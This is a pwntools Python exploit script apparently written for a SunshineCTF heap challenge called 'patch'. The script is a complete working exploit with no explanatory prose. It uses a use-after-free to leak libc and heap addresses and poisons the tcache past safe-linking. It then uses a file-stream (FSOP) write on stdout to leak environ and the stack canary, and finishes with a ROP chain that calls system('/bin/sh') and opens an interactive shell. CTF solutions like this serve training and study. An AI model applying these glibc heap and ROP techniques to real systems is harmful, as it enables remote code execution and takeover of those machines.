#!/usr/bin/env python3

from pwn import *

elf = ELF("./patch")
libc = ELF("./libc.so.6")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

gs = '''
break main
'''

domain = "chal.sunshinectf.games"
port = 25004

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

#========= exploit here ===================

def new(size):
    r.sendline(b"new " + str(size).encode())
    return r.recvuntil(b"> ").strip(b"> ")

def read_log(idx):
    r.sendline(b"read " + str(idx).encode())
    return r.recvuntil(b"> ").rstrip(b"> ")

def write_log(idx, data):
    r.sendline(b"write " + str(idx).encode())
    r.sendline(b"wow")
    sleep(.5)
    r.sendline(data)
    return r.recvuntil(b"> ").rstrip(b"> ")

def delete(idx):
    r.sendline(b"delete " + str(idx).encode())
    return r.recvuntil(b"> ").rstrip(b"> ")


### Leak libc, heap
r.recvuntil(b"> ")

new(0x410)
new(0x20)
delete(0)
delete(1)

leak = read_log(0)  
libc.address = u64(leak.ljust(8, b"\x00")) - 0x1e8b20 - 0x28000
r.info("LIBC BASE: " + hex(libc.address))

leak = read_log(1)
heap = (u64(leak.ljust(8, b"\x00")) << 12) - 0x1000
r.info("HEAP BASE: " + hex(heap))

new(0x60)
delete(2)
write_log(2,b"A"*16)
delete(2)

### FSOP to leak environ, stack canary
offset = 0x12d0 
write_log(2, p64(libc.symbols['_IO_2_1_stdout_'] ^ ((heap + offset) >> 12)))

environ = libc.symbols['environ']

new(0x60) # 3 
new(0x60) # 4

write_log(4,p32(0xfbad1800) + p32(0) + p64(environ)*3 + p64(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8))

r.recvuntil(b"Enter log data: ")
leak = r.recv(8)
stack_environ = u64(leak.ljust(8, b"\x00"))
target =  stack_environ - 0x160
r.info("STACK ENVIRON: " + hex(stack_environ))

r.recv(1024)

write_log(4,p32(0xfbad1800) + p32(0) + p64(target-0x10)*3 + p64(target-0x10) + p64(target-0x10 + 0x8)*2 + p64(target-0x10 + 8) + p64(target-0x10 + 8))


r.recvuntil(b"Enter log data: ")
stack_canary = u64(r.recv(8))
r.info("STACK CANARY: " + hex(stack_canary))

write_log(4,p32(0xfbad1800) + p32(0) + p64(environ)*3 + p64(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8))
r.recv(2048)

new(0x120) # 5
delete(5)
sleep(.5)
write_log(5,b"A"*16)
delete(5)

# ROP
offset = 0x1320 
print("TARGET: ",hex(target-0x48))
write_log(5, p64((target-0x48) ^ ((heap + offset) >> 12)))

new(0x120) # 6
new(0x120) # 7

rop = ROP(libc)
rop.call("system",[next(libc.search(b'/bin/sh\x00'))])
payload = b"A" * 56
payload += p64(stack_canary) + p64(0)
payload += p64(rop.find_gadget(['ret'])[0])
payload += rop.chain()

write_log(7,payload)
r.interactive()



